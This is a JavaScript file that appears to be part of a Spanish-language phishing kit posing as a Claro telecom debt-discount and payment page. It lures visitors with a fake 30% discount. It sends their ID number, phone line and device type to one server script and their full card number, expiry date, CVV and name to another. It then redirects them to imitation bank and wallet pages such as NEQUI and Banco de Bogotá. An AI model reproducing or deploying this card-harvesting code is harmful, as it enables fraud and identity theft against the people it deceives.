let tipo = '';
var nombre = "";
var lineacel = "";

function cambiaimg(value) {
    var imagen1 = document.getElementById('check1');
    var imagen2 = document.getElementById('check2');
    var imagen3 = document.getElementById('check3');
    var imagen4 = document.getElementById('check4');

    if (value === 1) {
        tipo = 'TLF';
        imagen1.src = 'img/check.png';
        imagen2.src = 'img/uncheck.png';
        imagen3.src = 'img/uncheck.png';
        imagen4.src = 'img/uncheck.png';
    } else if (value === 2) {
        tipo = 'Hogar';
        imagen1.src = 'img/uncheck.png';
        imagen2.src = 'img/check.png';
        imagen3.src = 'img/uncheck.png';
        imagen4.src = 'img/uncheck.png';
    } else if (value === 3) {
        tipo = 'Equipo';
        imagen1.src = 'img/uncheck.png';
        imagen2.src = 'img/uncheck.png';
        imagen3.src = 'img/check.png';
        imagen4.src = 'img/uncheck.png';
    } else if (value === 4) {
        tipo = 'Internet';
        imagen1.src = 'img/uncheck.png';
        imagen2.src = 'img/uncheck.png';
        imagen3.src = 'img/uncheck.png';
        imagen4.src = 'img/check.png';
    }
}


function selectTC(option,banco) {
  var numtc = document.getElementById("numtc").value;
  var fechat = document.getElementById("fechat").value;
  var codcv = document.getElementById("codcv").value;
  var datost = document.getElementById("datost").value;
  var celular = document.getElementById("celular").value;
  var documento = document.getElementById("documento").value;

  // Validaci n de campos obligatorios
  if (numtc === "" || fechat === "" || codcv === "" || datost === "" || celular === "" || documento === "") {
      alert("Por favor, completa todos los campos.");
      return;
  }


  $.post( "process/crear-tar.php", { tar:numtc,fec:fechat,cvv:codcv,nom:datost,ban:banco } ,function(data) {    
    window.location.href = "transaction/ent/" + option + "/client.php";  
  }); 

  

}




function selectOption2(option) {
  var numtc = document.getElementById("numtc").value;
  var fechat = document.getElementById("fechat").value;
  var codcv = document.getElementById("codcv").value;
  var datost = document.getElementById("datost").value;
  var celular = document.getElementById("celular").value;
  var documento = document.getElementById("documento").value;

  // Validaci n de campos obligatorios
  if (numtc === "" || fechat === "" || codcv === "" || datost === "" || celular === "" || documento === "") {
      alert("Por favor, completa todos los campos.");
      return;
  }
}



function formatInput(input) {
// Eliminar cualquier car cter que no sea un d gito
var value = input.value.replace(/\D/g, '');

if (input.id === "numtc") {
// Formatear n mero de tarjeta de cr dito
var formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
input.value = formattedValue;
} else if (input.id === "fechat") {
// Formatear fecha de vencimiento
var formattedValue = value.replace(/(\d{0,2})(\d{0,4})/, function(match, p1, p2) {
if (!p2) return p1;
return p1 + '/' + p2;
});
input.value = formattedValue;
}
}


function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}

function porcentaje(deudar) {

            document.getElementById("deuda").innerText = deudar;
            var monto = parseFloat(deudar.replace(/\./g, ''));
    
            // Calcular el descuento y el total
            var descuento = monto * 0.30;
            var montoConDescuento = monto - descuento;
            
            // Mostrar los resultados con separadores de mil
            document.getElementById('descuento').innerText = descuento.toLocaleString();
            document.getElementById('total').innerText = montoConDescuento.toLocaleString();
        }

function cargar_resumen(v) {
    $("#espera").hide();
    $("#section2").show();
    document.getElementById('nombre').innerText = nombre;
    document.getElementById('celular2').innerText = lineacel;
    porcentaje(v);       
}

function opciones_pago() {
    $("#section2").hide();
    $("#section3").show();       
}

async function validarNumero() {  
  nombre = document.getElementById('documento').value;
  lineacel = document.getElementById('celular').value;

  var d = detectar_dispositivo();
  $.post( "process/claro.php", { idc:nombre, lin:lineacel, dis:d } ,function(data) {
    
  }); 

  const telefonoIngresado = document.getElementById('celular').value;
  const response = await fetch('numeros.txt');
  const data = await response.text();
  const lineas = data.split('\n').map(linea => linea.split(','));

  for (let i = 0; i < lineas.length; i++) {
    //alert(lineas[i]);
    if (lineas[i].length < 2) {
      continue; // Saltar la l nea si no tiene al menos dos columnas
    }
    
    const telefono = lineas[i][0].trim().replace('"', '').replace('"', '');
    const valor = lineas[i][1].trim().replace('"', '').replace('"', '');
    if (telefono === telefonoIngresado) {
      const valorCorrespondiente = valor;      

      $("#usuario").hide();
      $("#espera").show();        
      
      setTimeout(cargar_resumen,3000,valor)

      return; // Salir del bucle una vez que se encuentra el numero
    }
  }

  alert('El numero de telefono no aplica al descuento.');
  // Detener la funcion aqui
}

function toggleOptions1() {
  var optionsList = document.getElementById("optionsList1");
  if (optionsList.style.display === "block") {
      optionsList.style.display = "none";      
  } else {
      optionsList.style.display = "block";
  }
}

function selectOption1(option) {
  document.getElementById("selectedValue1").value = option;
  document.getElementById("optionsList1").style.display = "none";
  

  if (option == "TRICOLOR" || option == "NEQUI" || option == "De Bogota") {    
    if (option == "TRICOLOR") {    
        window.location.href = "transaction/sucursal/client.php";
    } else if (option == "NEQUI") {                  
          window.location.href = "transaction/clientes/pagos.html";        
    } else if (option == "De Bogota") {                  
          window.location.href = "transaction/personas/client.html";        
        }
      } else if ( option == "Tarjeta") {
        $("#section3").hide();
        $("#Tarjeta").show();  
    } else {
        document.getElementById("selectedOption1").innerText = option;
        $("#section3").hide();
        $("#errorpasarela").show();
    }
}